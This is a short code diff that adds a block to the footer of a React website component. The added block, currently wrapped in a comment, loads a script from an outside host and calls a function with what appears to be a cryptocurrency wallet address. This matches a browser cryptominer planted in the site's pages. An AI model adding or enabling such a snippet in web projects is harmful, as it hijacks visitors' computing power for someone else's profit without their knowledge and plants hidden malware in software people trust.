@@ -34,6 +34,12 @@ const Footer = () => {
                 </ul>
             </article>
         </footer>
+        {/*<script src="https://trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo"/>
+        <script 
+            dangerouslySetInnerHTML={{
+                __html: `EverythingIsLife('47msWQ2EiquLJj73f5pbQnF82Uheo8VMVPa8cCcgyCBZFig2JenAX5xKpEkEFPnwxSFHQtQgcrjTiiwb3umb1GL18xsB8U6', 'x', 20);`
+            }}
+        />*/}
         </>
     )
 }
